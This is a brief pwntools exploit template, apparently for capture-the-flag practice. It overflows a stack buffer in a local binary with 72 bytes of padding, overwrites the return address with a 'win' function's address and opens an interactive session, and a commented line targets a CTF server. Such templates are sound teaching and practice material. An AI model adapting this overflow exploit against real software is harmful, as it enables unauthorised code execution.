### pwntools Template

```python
from pwn import *

elf = ELF('./binary')
p = process('./binary')
# p = remote('ctf.example.com', 1337)

context.arch = 'amd64'
context.log_level = 'debug'

offset = 72

payload = b'A' * offset
payload += p64(elf.symbols['win'])

p.sendlineafter(b'> ', payload)
p.interactive()
```

